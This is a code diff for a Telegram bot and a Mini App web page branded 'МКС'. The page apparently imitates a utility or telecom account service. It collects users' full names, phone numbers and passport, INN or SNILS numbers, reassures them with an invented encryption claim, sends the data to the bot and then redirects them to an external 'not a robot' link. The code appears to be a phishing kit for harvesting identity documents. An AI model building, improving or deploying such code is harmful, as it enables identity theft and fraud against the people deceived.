@@ -1,94 +1,319 @@
-import asyncio
-from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command
-from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>МКС Mini App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        h1 {
+            color: var(--tg-theme-link-color, #007bff);
+            text-align: center;
+        }
+        .menu {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            max-width: 400px;
+        }
+        .button {
+            background-color: var(--tg-theme-button-color, #007bff);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            border: none;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            text-align: center;
+            transition: background-color 0.3s;
+        }
+        .button:hover {
+            background-color: var(--tg-theme-secondary-bg-color, #0056b3);
+        }
+        .input {
+            width: 100%;
+            max-width: 400px;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid var(--tg-theme-hint-color, #cccccc);
+            font-size: 16px;
+            background-color: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+        }
+        .error {
+            color: red;
+            margin: 10px 0;
+            text-align: center;
+        }
+        .faq-item {
+            margin: 10px 0;
+        }
+        .back-button {
+            background-color: var(--tg-theme-secondary-bg-color, #6c757d);
+            color: #ffffff;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .inline-button {
+            background-color: #28a745;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div id="app" class="container"></div>
 
-# === ВСТАВЬ свой токен бота от BotFather ===
-API_TOKEN = "ТОКЕН_ТВОЕГО_БОТА"
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
 
-bot = Bot(API_TOKEN)
-dp = Dispatcher()
+        // Состояния как в FSM
+        const states = {
+            MAIN: 'main',
+            FULLNAME: 'fullname',
+            PHONE: 'phone',
+            DOCUMENT_TYPE: 'document_type',
+            DOCUMENT_NUMBER: 'document_number',
+            ADDITIONAL_SERVICES: 'additional_services',
+            FAQ: 'faq',
+            INSTRUCTION: 'instruction',
+            SUPPORT: 'support'
+        };
 
-# ====== Хранилище пользователей ======
-users = {}
+        let currentState = states.MAIN;
+        let formData = {
+            fullname: '',
+            phone: '',
+            document_type: '',
+            document_number: ''
+        };
 
-# ====== Клавиатуры ======
-main_kb = ReplyKeyboardMarkup(
-    keyboard=[
-        [KeyboardButton(text="💰 Баланс"), KeyboardButton(text="📊 Тариф")],
-        [KeyboardButton(text="❓ Вопросы"), KeyboardButton(text="ℹ️ Инструкция")],
-        [KeyboardButton(text="🛠 Техподдержка")],
-        [KeyboardButton(text="🚀 Открыть МКС")]
-    ],
-    resize_keyboard=True
-)
+        // Функция для рендеринга контента
+        function render() {
+            const app = document.getElementById('app');
+            app.innerHTML = '';
 
-# ====== Старт ======
-@dp.message(Command("start"))
-async def start_cmd(message: types.Message):
-    user_id = message.from_user.id
-    if user_id not in users:
-        users[user_id] = {"authorized": False, "fio": None, "phone": None, "doc": None}
-    await message.answer("👋 Добро пожаловать в МКС!\nДля продолжения введите ваше ФИО:")
+            if (currentState === states.MAIN) {
+                app.innerHTML = `
+                    <h1>🏠 Добро пожаловать в МКС-бот! 💧</h1>
+                    <p>Управляйте своими услугами легко и быстро! ✨</p>
+                `;
+                createButton('📝 Обновить данные', () => { currentState = states.FULLNAME; render(); });
+                createButton('🔄 Поменять тариф', handleUnauthorized);
+                createButton('💳 Проверить баланс', handleUnauthorized);
+                createButton('💸 Пополнить баланс', handleUnauthorized);
+                createButton('🛠️ Дополнительные услуги', () => { currentState = states.ADDITIONAL_SERVICES; render(); });
+            } else if (currentState === states.FULLNAME) {
+                app.innerHTML = `
+                    <h1>📝 Обновить данные</h1>
+                    <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
+                    <p>👤 Укажите Фамилию Имя Отчество полностью (только текст): 🌟</p>
+                    <input id="fullnameInput" class="input" type="text" placeholder="Фамилия Имя Отчество">
+                    <div id="error" class="error"></div>
+                `;
+                createButton('↩️ Вернуться назад', () => { currentState = states.MAIN; render(); }, 'back-button');
+                createButton('Далее', handleFullname);
+            } else if (currentState === states.PHONE) {
+                app.innerHTML = `
+                    <h1>📝 Обновить данные</h1>
+                    <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
+                    <p>📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567): 💧</p>
+                    <input id="phoneInput" class="input" type="text" placeholder="+79991234567">
+                    <div id="error" class="error"></div>
+                `;
+                createButton('↩️ Вернуться назад', () => { currentState = states.FULLNAME; render(); }, 'back-button');
+                createButton('Далее', handlePhone);
+            } else if (currentState === states.DOCUMENT_TYPE) {
+                app.innerHTML = `
+                    <h1>📝 Обновить данные</h1>
+                    <p>Выберите документ: 🌟</p>
+                `;
+                createButton('📄 Паспорт', () => { formData.document_type = 'Паспорт'; currentState = states.DOCUMENT_NUMBER; render(); });
+                createButton('🧾 ИНН', () => { formData.document_type = 'ИНН'; currentState = states.DOCUMENT_NUMBER; render(); });
+                createButton('🟢 СНИЛС', () => { formData.document_type = 'СНИЛС'; currentState = states.DOCUMENT_NUMBER; render(); });
+                createButton('↩️ Вернуться назад', () => { currentState = states.PHONE; render(); }, 'back-button');
+            } else if (currentState === states.DOCUMENT_NUMBER) {
+                let placeholder = '';
+                if (formData.document_type === 'Паспорт') placeholder = '4510 123456';
+                else if (formData.document_type === 'ИНН') placeholder = '500100732259';
+                else if (formData.document_type === 'СНИЛС') placeholder = '112-233-445 95';
 
-# ====== Обработка сообщений ======
-@dp.message()
-async def handle_message(message: types.Message):
-    user_id = message.from_user.id
-    text = message.text
+                app.innerHTML = `
+                    <h1>📝 Обновить данные</h1>
+                    <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
+                    <p>Введите ${formData.document_type} (пример: ${placeholder}): 🌟</p>
+                    <input id="docNumberInput" class="input" type="text" placeholder="${placeholder}">
+                    <div id="error" class="error"></div>
+                `;
+                createButton('↩️ Вернуться назад', () => { currentState = states.DOCUMENT_TYPE; render(); }, 'back-button');
+                createButton('Подтвердить', handleDocumentNumber);
+            } else if (currentState === states.ADDITIONAL_SERVICES) {
+                app.innerHTML = `
+                    <h1>🛠️ Дополнительные услуги</h1>
+                    <p>Выберите опцию: 🌟</p>
+                `;
+                createButton('❓ Часто задаваемые вопросы', () => { currentState = states.FAQ; render(); });
+                createButton('ℹ️ Инструкция', () => { currentState = states.INSTRUCTION; render(); });
+                createButton('📞 Связаться с техподдержкой', () => { currentState = states.SUPPORT; render(); });
+                createButton('↩️ Вернуться назад', () => { currentState = states.MAIN; render(); }, 'back-button');
+            } else if (currentState === states.FAQ) {
+                app.innerHTML = `
+                    <h1>❓ Часто задаваемые вопросы</h1>
+                `;
+                createFAQButton('⏳ До какого числа нужно передавать показания?', '📌 Показания счетчиков нужно передавать до 25 числа каждого месяца. 💧');
+                createFAQButton('💸 Что будет, если не передать данные вовремя?', '⚠️ Плата будет начислена по среднему — исходя из показаний за последние полгода. 🔥');
+                createFAQButton('🔒 Это безопасно?', '🔐 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование). ✨');
+                createFAQButton('⚡️ Почему через Telegram?', '⚡️ Для удобства и переход на цифровые площадки. 💧');
+                createFAQButton('🔁 Можно ли исправить ошибку?', '✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод. 🌟');
+                createFAQButton('📑 Какие документы можно использовать?', '👉 Паспорт, ИНН, СНИЛС. 💧');
+                createButton('↩️ Вернуться назад', () => { currentState = states.ADDITIONAL_SERVICES; render(); }, 'back-button');
+            } else if (currentState === states.INSTRUCTION) {
+                app.innerHTML = `
+                    <h1>ℹ️ Инструкция</h1>
+                    <p>📋 Чтобы обновить данные:<br>
+                    1️⃣ Нажмите «Обновить данные».<br>
+                    2️⃣ Отправьте номер телефона.<br>
+                    3️⃣ Выберите документ и введите его номер.<br>
+                    4️⃣ Получите подтверждение. ✨<br><br>
+                    На любом этапе вы можете нажать '↩️ Вернуться назад'. 💧</p>
+                `;
+                createButton('↩️ Вернуться назад', () => { currentState = states.ADDITIONAL_SERVICES; render(); }, 'back-button');
+            } else if (currentState === states.SUPPORT) {
+                app.innerHTML = `
+                    <h1>📞 Связаться с техподдержкой</h1>
+                    <p>📞 Для связи с техподдержкой нажмите на кнопку ниже или используйте ссылку вручную! ✨</p>
+                    <a href="https://t.me/MymtcSup" class="inline-button">📞 Написать в техподдержку</a>
+                `;
+                createButton('↩️ Вернуться назад', () => { currentState = states.ADDITIONAL_SERVICES; render(); }, 'back-button');
+            }
+        }
 
-    if user_id not in users:
-        users[user_id] = {"authorized": False, "fio": None, "phone": None, "doc": None}
+        // Функция для создания кнопки
+        function createButton(text, onClick, className = 'button') {
+            const btn = document.createElement('button');
+            btn.className = className;
+            btn.textContent = text;
+            btn.onclick = onClick;
+            document.getElementById('app').appendChild(btn);
+        }
 
-    user = users[user_id]
+        // Функция для FAQ кнопок (показ ответа по клику)
+        function createFAQButton(question, answer) {
+            const btn = document.createElement('button');
+            btn.className = 'button faq-item';
+            btn.textContent = question;
+            btn.onclick = () => {
+                const app = document.getElementById('app');
+                const answerDiv = document.createElement('div');
+                answerDiv.innerHTML = `<p>${answer}</p>`;
+                app.appendChild(answerDiv);
+                createButton('↩️ Вернуться назад', () => { currentState = states.FAQ; render(); }, 'back-button');
+                btn.remove(); // Удаляем кнопку после клика, чтобы показать ответ
+            };
+            document.getElementById('app').appendChild(btn);
+        }
 
-    # Авторизация по шагам
-    if not user["authorized"]:
-        if user["fio"] is None:
-            user["fio"] = text
-            await message.answer("📱 Введите ваш номер телефона:")
-            return
-        if user["phone"] is None:
-            user["phone"] = text
-            await message.answer("🆔 Введите номер документа:")
-            return
-        if user["doc"] is None:
-            user["doc"] = text
-            user["authorized"] = True
-            await message.answer("✅ Авторизация успешна!", reply_markup=main_kb)
-            return
+        // Обработка неавторизованных действий
+        function handleUnauthorized() {
+            const app = document.getElementById('app');
+            app.innerHTML = `
+                <h1>🔒 Не авторизовано</h1>
+                <p>Мы не можем выполнить действие, потому что вы не авторизовались. 🔥</p>
+            `;
+            createButton('🔐 Авторизоваться', () => { currentState = states.FULLNAME; render(); });
+            createButton('↩️ Сменить действие', () => { currentState = states.MAIN; render(); }, 'back-button');
+        }
 
-    # Если авторизован → команды меню
-    if user["authorized"]:
-        if text == "💰 Баланс":
-            await message.answer("Ваш баланс: 1 250 ₽")
-        elif text == "📊 Тариф":
-            await message.answer("Ваш тариф: «МКС Комфорт+» — 500 ₽/мес")
-        elif text == "❓ Вопросы":
-            await message.answer("❓ Часто задаваемые вопросы:\n1. Как оплатить?\n2. Как сменить тариф?\n3. Как связаться с поддержкой?")
-        elif text == "ℹ️ Инструкция":
-            await message.answer("ℹ️ Инструкция:\n1. Авторизуйтесь в системе.\n2. Проверьте баланс.\n3. Используйте меню для управления услугами.")
-        elif text == "🛠 Техподдержка":
-            kb = InlineKeyboardMarkup(
-                inline_keyboard=[
-                    [InlineKeyboardButton(text="📞 Позвонить", url="tel:+3800000000")],
-                    [InlineKeyboardButton(text="💬 Написать в Telegram", url="https://t.me/username_support")]
-                ]
-            )
-            await message.answer("🛠 Выберите способ связи с техподдержкой:", reply_markup=kb)
-        elif text == "🚀 Открыть МКС":
-            kb = InlineKeyboardMarkup(
-                inline_keyboard=[
-                    [InlineKeyboardButton(text="🌐 Запустить WebApp", web_app=WebAppInfo(url="https://benworkmod228-coder.github.io/cosmic-shawarma/mcs.html"))]
-                ]
-            )
-            await message.answer("Откройте мини-приложение МКС:", reply_markup=kb)
-        else:
-            await message.answer("⚠️ Неизвестная команда. Используйте меню.", reply_markup=main_kb)
+        // Валидация и обработка ФИО
+        function handleFullname() {
+            const input = document.getElementById('fullnameInput').value.trim();
+            const error = document.getElementById('error');
+            if (!/^[А-Яа-яЁё\s-]+$/.test(input)) {
+                error.textContent = '❌ ФИО должно содержать только буквы. Попробуйте снова. 🔥';
+                return;
+            }
+            formData.fullname = input.replace(/\s+/g, ' ');
+            savePartial();
+            currentState = states.PHONE;
+            render();
+        }
 
-# ====== Запуск ======
-async def main():
-    await dp.start_polling(bot)
+        // Валидация и обработка телефона
+        function handlePhone() {
+            const input = document.getElementById('phoneInput').value.trim();
+            const error = document.getElementById('error');
+            const digits = input.replace(/[^0-9]/g, '');
+            if (!input.startsWith('+7') && !input.startsWith('7')) {
+                error.textContent = '❌ Номер телефона должен начинаться с +7 или 7. Попробуйте снова. 🔥';
+                return;
+            }
+            if (digits.length < 10 || digits.length > 11) {
+                error.textContent = '❌ Номер телефона должен содержать 10 или 11 цифр. Попробуйте снова. 🔥';
+                return;
+            }
+            formData.phone = input;
+            savePartial();
+            currentState = states.DOCUMENT_TYPE;
+            render();
+        }
 
-if __name__ == "__main__":
-    asyncio.run(main())
+        // Обработка номера документа
+        function handleDocumentNumber() {
+            const input = document.getElementById('docNumberInput').value.trim();
+            const error = document.getElementById('error');
+            if (!input) {
+                error.textContent = '❌ Введите номер документа. 🔥';
+                return;
+            }
+            formData.document_number = input;
+            savePartial(true);
+            // Показываем подтверждение
+            const app = document.getElementById('app');
+            app.innerHTML = `
+                <h1>✅ Подтверждение</h1>
+                <p>Для завершения подтвердите что вы не робот! ✨</p>
+                <a href="https://redirect.figma.site/" class="inline-button">✅ Подтвердить, что не робот</a>
+            `;
+            // Отправляем данные боту
+            const dataToSend = JSON.stringify(formData);
+            tg.sendData(dataToSend); // Отправка данных боту для обработки (бот должен иметь обработчик onWebAppData)
+            createButton('↩️ Вернуться в меню', () => { resetForm(); currentState = states.MAIN; render(); }, 'back-button');
+        }
+
+        // Симуляция сохранения (в реальности отправлять на сервер или логировать)
+        function savePartial(isComplete = false) {
+            console.log('Сохранены данные:', formData); // Здесь можно отправить на сервер через fetch, если есть бэкенд
+            // В боте это сохранялось в файл; здесь логируем или отправляем
+        }
+
+        function resetForm() {
+            formData = { fullname: '', phone: '', document_type: '', document_number: '' };
+        }
+
+        // Инициализация
+        render();
+    </script>
+</body>
+</html>
